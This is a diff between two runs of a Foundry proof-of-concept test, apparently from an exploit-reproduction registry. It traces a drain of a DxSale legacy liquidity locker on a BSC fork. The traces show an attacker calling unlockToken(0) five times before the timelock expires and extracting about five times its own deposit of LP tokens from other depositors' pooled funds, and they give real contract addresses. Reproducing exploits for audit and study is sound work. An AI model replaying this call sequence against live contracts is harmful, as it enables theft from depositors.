@@ -1,66 +1,59 @@
-Compiling 21 files with Solc 0.8.34
-Solc 0.8.34 finished in 486.50ms
+Compiling 20 files with Solc 0.8.34
+Solc 0.8.34 finished in 399.53ms
 Compiler run successful with warnings:
-Warning (2519): This declaration shadows an existing declaration.
-    --> interface.sol:1084:5:
-     |
-1084 |     function WETH() external view returns (address);
-     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-Note: The shadowed declaration is here:
-   --> interface.sol:805:1:
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/StdStorage.sol:297:13:
     |
-805 | interface WETH {
-    | ^ (Relevant source part starts here and spans across multiple lines).
+297 |             assembly {
+    |             ^ (Relevant source part starts here and spans across multiple lines).
 
-Warning (2519): This declaration shadows an existing declaration.
-    --> interface.sol:1896:5:
-     |
-1896 |     function WETH() external view returns (address);
-     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-Note: The shadowed declaration is here:
-   --> interface.sol:805:1:
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/StdStorage.sol:404:9:
     |
-805 | interface WETH {
-    | ^ (Relevant source part starts here and spans across multiple lines).
+404 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
 
-Warning (2519): This declaration shadows an existing declaration.
-    --> interface.sol:2198:5:
-     |
-2198 |     function WETH() external view returns (address);
-     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-Note: The shadowed declaration is here:
-   --> interface.sol:805:1:
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/StdChains.sol:179:21:
     |
-805 | interface WETH {
-    | ^ (Relevant source part starts here and spans across multiple lines).
-
-Warning (2519): This declaration shadows an existing declaration.
-    --> interface.sol:2967:5:
-     |
-2967 |     function WETH() external view returns (address);
-     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-Note: The shadowed declaration is here:
-   --> interface.sol:805:1:
-    |
-805 | interface WETH {
-    | ^ (Relevant source part starts here and spans across multiple lines).
-
-Warning (2519): This declaration shadows an existing declaration.
-    --> interface.sol:4462:5:
-     |
-4462 |     function WETH() external view returns (address);
-     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-Note: The shadowed declaration is here:
-   --> interface.sol:805:1:
-    |
-805 | interface WETH {
-    | ^ (Relevant source part starts here and spans across multiple lines).
+179 |                     assembly {
+    |                     ^ (Relevant source part starts here and spans across multiple lines).
 
 Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
   --> lib/forge-std/src/console.sol:11:9:
    |
 11 |         assembly {
    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/StdCheats.sol:505:9:
+    |
+505 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/StdCheats.sol:515:9:
+    |
+515 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/StdCheats.sol:526:9:
+    |
+526 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/StdCheats.sol:536:9:
+    |
+536 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/StdUtils.sol:192:9:
+    |
+192 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
 
 Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
   --> lib/forge-std/src/safeconsole.sol:15:9:
@@ -1538,78 +1531,159 @@ Warning (2424): Natspec memory-safe-assembly special comment for inline assembly
 4256 |         assembly {
      |         ^ (Relevant source part starts here and spans across multiple lines).
 
-Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
-    --> lib/forge-std/src/safeconsole.sol:4271:9:
-     |
-4271 |         assembly {
-     |         ^ (Relevant source part starts here and spans across multiple lines).
-
-Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
-    --> lib/forge-std/src/safeconsole.sol:4289:9:
-     |
-4289 |         assembly {
-     |         ^ (Relevant source part starts here and spans across multiple lines).
-
-Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
-    --> lib/forge-std/src/safeconsole.sol:4314:9:
-     |
-4314 |         assembly {
-     |         ^ (Relevant source part starts here and spans across multiple lines).
-
 Warning (4591): There are more than 256 warnings. Ignoring the rest.
 
 Ran 1 test for test/DxSale_exp.sol:DxSaleExploitTest
-[PASS] testExploit() (gas: 43556)
+[PASS] testExploit() (gas: 130710)
 Logs:
-  --- DxSale Legacy Liquidity Locker Exploit ---
-  Attack date: May 28, 2026
-  Attacker BNB before: 104
-  Victim lock count: 10
-  Drained lockId 0
-  Attacker BNB after: 104
-  Victim locks remaining: 10
+  --- DxSale Legacy Locker: repeated unlockToken() drain ---
+  Locker's pooled Cake-LP balance before: 22225610273606542359732
+  Attacker's Cake-LP balance before: 0
+  Attacker's lock #0 exists: true
+  Attacker's lock #0 locked: true
+  Attacker's lock #0 lockedAmount: 12872812929106341247
+  Attacker's lock #0 unlockTime (still years in the future): 2095279047
+  block.timestamp: 1779921464
+  unlockToken(0) call # 1 succeeded
+  unlockToken(0) call # 2 succeeded
+  unlockToken(0) call # 3 succeeded
+  unlockToken(0) call # 4 succeeded
+  unlockToken(0) call # 5 succeeded
+  Attacker's Cake-LP balance after 5 calls: 64364064645531706235
+  Locker's pooled Cake-LP balance after: 22161246208961010653497
+  Total Cake-LP extracted (5 calls): 64364064645531706235
+  Attacker's fair share (1 deposit): 12872812929106341247
+  Stolen from OTHER depositors' pooled funds: 51491251716425364988
 
 Traces:
-  [6578] DxSaleExploitTest::setUp()
-    ├─ [0] VM::createSelectFork("bsc", 100806730 [1.008e8])
+  [5675] DxSaleExploitTest::setUp()
+    ├─ [0] VM::createSelectFork("<rpc url>", 100812089 [1.008e8])
     │   └─ ← [Return] 0
     ├─ [0] VM::label(DxSale_Legacy_Locker: [0xEb3a9C56d963b971d320f889bE2fb8B59853e449], "DxSale_Legacy_Locker")
     │   └─ ← [Return]
+    ├─ [0] VM::label(Cake-LP (victim pair): [0x88DA6Bc38D5BFEF6e332F87E06a310a9e5f768E2], "Cake-LP (victim pair)")
+    │   └─ ← [Return]
     ├─ [0] VM::label(Attacker: [0xC4574DDEF299e7E563971e200433e592EeaaFA69], "Attacker")
-    │   └─ ← [Return]
-    ├─ [0] VM::label(Victim: [0xc7Fc793e685A1dc80f517E7EE903859F72BE0Aa8], "Victim")
-    │   └─ ← [Return]
-    ├─ [0] VM::label(WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], "WBNB")
     │   └─ ← [Return]
     └─ ← [Stop]
 
-  [43556] DxSaleExploitTest::testExploit()
-    ├─ [0] console::log("--- DxSale Legacy Liquidity Locker Exploit ---") [staticcall]
+  [130710] DxSaleExploitTest::testExploit()
+    ├─ [0] console::log("--- DxSale Legacy Locker: repeated unlockToken() drain ---") [staticcall]
     │   └─ ← [Stop]
-    ├─ [0] console::log("Attack date: May 28, 2026") [staticcall]
+    ├─ [2537] Cake-LP (victim pair)::balanceOf(DxSale_Legacy_Locker: [0xEb3a9C56d963b971d320f889bE2fb8B59853e449]) [staticcall]
+    │   └─ ← [Return] 22225610273606542359732 [2.222e22]
+    ├─ [2537] Cake-LP (victim pair)::balanceOf(Attacker: [0xC4574DDEF299e7E563971e200433e592EeaaFA69]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] console::log("Locker's pooled Cake-LP balance before:", 22225610273606542359732 [2.222e22]) [staticcall]
     │   └─ ← [Stop]
-    ├─ [0] console::log("Attacker BNB before:", 104) [staticcall]
+    ├─ [0] console::log("Attacker's Cake-LP balance before:", 0) [staticcall]
     │   └─ ← [Stop]
-    ├─ [2446] DxSale_Legacy_Locker::UserLockerCount(Victim: [0xc7Fc793e685A1dc80f517E7EE903859F72BE0Aa8]) [staticcall]
-    │   └─ ← [Return] 10
-    ├─ [0] console::log("Victim lock count:", 10) [staticcall]
+    ├─ [13720] DxSale_Legacy_Locker::DXLOCKERLP(Attacker: [0xC4574DDEF299e7E563971e200433e592EeaaFA69], 0) [staticcall]
+    │   └─ ← [Return] true, true, "", 12872812929106341247 [1.287e19], 2095279047 [2.095e9], 1779919052 [1.779e9], Cake-LP (victim pair): [0x88DA6Bc38D5BFEF6e332F87E06a310a9e5f768E2]
+    ├─ [0] console::log("Attacker's lock #0 exists:", true) [staticcall]
     │   └─ ← [Stop]
+    ├─ [0] console::log("Attacker's lock #0 locked:", true) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("Attacker's lock #0 lockedAmount:", 12872812929106341247 [1.287e19]) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("Attacker's lock #0 unlockTime (still years in the future):", 2095279047 [2.095e9]) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("block.timestamp:", 1779921464 [1.779e9]) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] VM::assertTrue(true, "sanity: this lock's real timelock has NOT expired") [staticcall]
+    │   └─ ← [Return]
     ├─ [0] VM::startPrank(Attacker: [0xC4574DDEF299e7E563971e200433e592EeaaFA69])
     │   └─ ← [Return]
-    ├─ [20615] DxSale_Legacy_Locker::DXLOCKERLP(Victim: [0xc7Fc793e685A1dc80f517E7EE903859F72BE0Aa8], 0)
-    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000e0000000000000000000000000000000000000000000000346cddf98603fd0b9c900000000000000000000000000000000000000000000000000000000f48799bc000000000000000000000000000000000000000000000000000000006091c2f4000000000000000000000000f51bf75d28748ff37b282eaf314e2b82fff900e0000000000000000000000000000000000000000000000000000000000000005968747470733a2f2f6173736574732e636f727573656e742e636f6d2f77702d636f6e74656e742f75706c6f6164732f323031352f30392f736c696465722d7472616e73706172656e742d706c616365686f6c6465722e706e6700000000000000
-    ├─ [0] console::log("Drained lockId 0") [staticcall]
+    ├─ [31388] DxSale_Legacy_Locker::unlockToken(0)
+    │   ├─ [537] Cake-LP (victim pair)::balanceOf(DxSale_Legacy_Locker: [0xEb3a9C56d963b971d320f889bE2fb8B59853e449]) [staticcall]
+    │   │   └─ ← [Return] 22225610273606542359732 [2.222e22]
+    │   ├─ [26003] Cake-LP (victim pair)::transfer(Attacker: [0xC4574DDEF299e7E563971e200433e592EeaaFA69], 12872812929106341247 [1.287e19])
+    │   │   ├─ emit Transfer(from: DxSale_Legacy_Locker: [0xEb3a9C56d963b971d320f889bE2fb8B59853e449], to: Attacker: [0xC4574DDEF299e7E563971e200433e592EeaaFA69], amount: 12872812929106341247 [1.287e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x5bd00193a3511bd5513a9efbebcd3db4e735cbce48bd803d5cdc493e18aff1c9: 0 → 0x000000000000000000000000000000000000000000000000b2a56b27eb706d7f
+    │   │   │   @ 0x557573319f47abae2be2e95f122a50c09105d57676c738f76505b25592cffe63: 0x0000000000000000000000000000000000000000000004b4da4da383de64fcb4 → 0x0000000000000000000000000000000000000000000004b427a8385bf2f48f35
+    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   ├─ emit onUnlock(: Attacker: [0xC4574DDEF299e7E563971e200433e592EeaaFA69], : Cake-LP (victim pair): [0x88DA6Bc38D5BFEF6e332F87E06a310a9e5f768E2], : 12872812929106341247 [1.287e19], : 1779921464 [1.779e9])
+    │   └─ ← [Stop]
+    ├─ [0] console::log("unlockToken(0) call #", 1, "succeeded") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [8688] DxSale_Legacy_Locker::unlockToken(0)
+    │   ├─ [537] Cake-LP (victim pair)::balanceOf(DxSale_Legacy_Locker: [0xEb3a9C56d963b971d320f889bE2fb8B59853e449]) [staticcall]
+    │   │   └─ ← [Return] 22212737460677436018485 [2.221e22]
+    │   ├─ [3303] Cake-LP (victim pair)::transfer(Attacker: [0xC4574DDEF299e7E563971e200433e592EeaaFA69], 12872812929106341247 [1.287e19])
+    │   │   ├─ emit Transfer(from: DxSale_Legacy_Locker: [0xEb3a9C56d963b971d320f889bE2fb8B59853e449], to: Attacker: [0xC4574DDEF299e7E563971e200433e592EeaaFA69], amount: 12872812929106341247 [1.287e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x557573319f47abae2be2e95f122a50c09105d57676c738f76505b25592cffe63: 0x0000000000000000000000000000000000000000000004b427a8385bf2f48f35 → 0x0000000000000000000000000000000000000000000004b37502cd34078421b6
+    │   │   │   @ 0x5bd00193a3511bd5513a9efbebcd3db4e735cbce48bd803d5cdc493e18aff1c9: 0x000000000000000000000000000000000000000000000000b2a56b27eb706d7f → 0x000000000000000000000000000000000000000000000001654ad64fd6e0dafe
+    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   ├─ emit onUnlock(: Attacker: [0xC4574DDEF299e7E563971e200433e592EeaaFA69], : Cake-LP (victim pair): [0x88DA6Bc38D5BFEF6e332F87E06a310a9e5f768E2], : 12872812929106341247 [1.287e19], : 1779921464 [1.779e9])
+    │   └─ ← [Stop]
+    ├─ [0] console::log("unlockToken(0) call #", 2, "succeeded") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [8688] DxSale_Legacy_Locker::unlockToken(0)
+    │   ├─ [537] Cake-LP (victim pair)::balanceOf(DxSale_Legacy_Locker: [0xEb3a9C56d963b971d320f889bE2fb8B59853e449]) [staticcall]
+    │   │   └─ ← [Return] 22199864647748329677238 [2.219e22]
+    │   ├─ [3303] Cake-LP (victim pair)::transfer(Attacker: [0xC4574DDEF299e7E563971e200433e592EeaaFA69], 12872812929106341247 [1.287e19])
+    │   │   ├─ emit Transfer(from: DxSale_Legacy_Locker: [0xEb3a9C56d963b971d320f889bE2fb8B59853e449], to: Attacker: [0xC4574DDEF299e7E563971e200433e592EeaaFA69], amount: 12872812929106341247 [1.287e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x5bd00193a3511bd5513a9efbebcd3db4e735cbce48bd803d5cdc493e18aff1c9: 0x000000000000000000000000000000000000000000000001654ad64fd6e0dafe → 0x00000000000000000000000000000000000000000000000217f04177c251487d
+    │   │   │   @ 0x557573319f47abae2be2e95f122a50c09105d57676c738f76505b25592cffe63: 0x0000000000000000000000000000000000000000000004b37502cd34078421b6 → 0x0000000000000000000000000000000000000000000004b2c25d620c1c13b437
+    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   ├─ emit onUnlock(: Attacker: [0xC4574DDEF299e7E563971e200433e592EeaaFA69], : Cake-LP (victim pair): [0x88DA6Bc38D5BFEF6e332F87E06a310a9e5f768E2], : 12872812929106341247 [1.287e19], : 1779921464 [1.779e9])
+    │   └─ ← [Stop]
+    ├─ [0] console::log("unlockToken(0) call #", 3, "succeeded") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [8688] DxSale_Legacy_Locker::unlockToken(0)
+    │   ├─ [537] Cake-LP (victim pair)::balanceOf(DxSale_Legacy_Locker: [0xEb3a9C56d963b971d320f889bE2fb8B59853e449]) [staticcall]
+    │   │   └─ ← [Return] 22186991834819223335991 [2.218e22]
+    │   ├─ [3303] Cake-LP (victim pair)::transfer(Attacker: [0xC4574DDEF299e7E563971e200433e592EeaaFA69], 12872812929106341247 [1.287e19])
+    │   │   ├─ emit Transfer(from: DxSale_Legacy_Locker: [0xEb3a9C56d963b971d320f889bE2fb8B59853e449], to: Attacker: [0xC4574DDEF299e7E563971e200433e592EeaaFA69], amount: 12872812929106341247 [1.287e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x557573319f47abae2be2e95f122a50c09105d57676c738f76505b25592cffe63: 0x0000000000000000000000000000000000000000000004b2c25d620c1c13b437 → 0x0000000000000000000000000000000000000000000004b20fb7f6e430a346b8
+    │   │   │   @ 0x5bd00193a3511bd5513a9efbebcd3db4e735cbce48bd803d5cdc493e18aff1c9: 0x00000000000000000000000000000000000000000000000217f04177c251487d → 0x000000000000000000000000000000000000000000000002ca95ac9fadc1b5fc
+    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   ├─ emit onUnlock(: Attacker: [0xC4574DDEF299e7E563971e200433e592EeaaFA69], : Cake-LP (victim pair): [0x88DA6Bc38D5BFEF6e332F87E06a310a9e5f768E2], : 12872812929106341247 [1.287e19], : 1779921464 [1.779e9])
+    │   └─ ← [Stop]
+    ├─ [0] console::log("unlockToken(0) call #", 4, "succeeded") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [8688] DxSale_Legacy_Locker::unlockToken(0)
+    │   ├─ [537] Cake-LP (victim pair)::balanceOf(DxSale_Legacy_Locker: [0xEb3a9C56d963b971d320f889bE2fb8B59853e449]) [staticcall]
+    │   │   └─ ← [Return] 22174119021890116994744 [2.217e22]
+    │   ├─ [3303] Cake-LP (victim pair)::transfer(Attacker: [0xC4574DDEF299e7E563971e200433e592EeaaFA69], 12872812929106341247 [1.287e19])
+    │   │   ├─ emit Transfer(from: DxSale_Legacy_Locker: [0xEb3a9C56d963b971d320f889bE2fb8B59853e449], to: Attacker: [0xC4574DDEF299e7E563971e200433e592EeaaFA69], amount: 12872812929106341247 [1.287e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x5bd00193a3511bd5513a9efbebcd3db4e735cbce48bd803d5cdc493e18aff1c9: 0x000000000000000000000000000000000000000000000002ca95ac9fadc1b5fc → 0x0000000000000000000000000000000000000000000000037d3b17c79932237b
+    │   │   │   @ 0x557573319f47abae2be2e95f122a50c09105d57676c738f76505b25592cffe63: 0x0000000000000000000000000000000000000000000004b20fb7f6e430a346b8 → 0x0000000000000000000000000000000000000000000004b15d128bbc4532d939
+    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   ├─ emit onUnlock(: Attacker: [0xC4574DDEF299e7E563971e200433e592EeaaFA69], : Cake-LP (victim pair): [0x88DA6Bc38D5BFEF6e332F87E06a310a9e5f768E2], : 12872812929106341247 [1.287e19], : 1779921464 [1.779e9])
+    │   └─ ← [Stop]
+    ├─ [0] console::log("unlockToken(0) call #", 5, "succeeded") [staticcall]
     │   └─ ← [Stop]
     ├─ [0] VM::stopPrank()
     │   └─ ← [Return]
-    ├─ [0] console::log("Attacker BNB after:", 104) [staticcall]
+    ├─ [537] Cake-LP (victim pair)::balanceOf(Attacker: [0xC4574DDEF299e7E563971e200433e592EeaaFA69]) [staticcall]
+    │   └─ ← [Return] 64364064645531706235 [6.436e19]
+    ├─ [537] Cake-LP (victim pair)::balanceOf(DxSale_Legacy_Locker: [0xEb3a9C56d963b971d320f889bE2fb8B59853e449]) [staticcall]
+    │   └─ ← [Return] 22161246208961010653497 [2.216e22]
+    ├─ [0] console::log("Attacker's Cake-LP balance after 5 calls:", 64364064645531706235 [6.436e19]) [staticcall]
     │   └─ ← [Stop]
-    ├─ [446] DxSale_Legacy_Locker::UserLockerCount(Victim: [0xc7Fc793e685A1dc80f517E7EE903859F72BE0Aa8]) [staticcall]
-    │   └─ ← [Return] 10
-    ├─ [0] console::log("Victim locks remaining:", 10) [staticcall]
+    ├─ [0] console::log("Locker's pooled Cake-LP balance after:", 22161246208961010653497 [2.216e22]) [staticcall]
     │   └─ ← [Stop]
+    ├─ [0] console::log("Total Cake-LP extracted (5 calls):", 64364064645531706235 [6.436e19]) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("Attacker's fair share (1 deposit):", 12872812929106341247 [1.287e19]) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("Stolen from OTHER depositors' pooled funds:", 51491251716425364988 [5.149e19]) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] VM::assertEq(64364064645531706235 [6.436e19], 64364064645531706235 [6.436e19], "expected exactly 5x payout") [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::assertGt(51491251716425364988 [5.149e19], 0, "attacker must extract MORE than their own deposit") [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::assertEq(64364064645531706235 [6.436e19], 64364064645531706235 [6.436e19], "pool must have paid out the full extracted amount") [staticcall]
+    │   └─ ← [Return]
     └─ ← [Stop]
 
-Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 4.24s (3.09s CPU time)
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 6.57ms (1.97ms CPU time)
 
-Ran 1 test suite in 5.69s (4.24s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
+Ran 1 test suite in 116.10ms (6.57ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
+_shared/run_poc.sh: line 68: 58595 Killed: 9               anvil --load-state "$TMPROOT/anvil_state.json" --port 0 --chain-id "$CHAINID" > "$ANVIL_LOG" 2>&1  (wd: ~/RustroverProjects/audits/evm-hack-registry/2026-05-DxSale_exp)
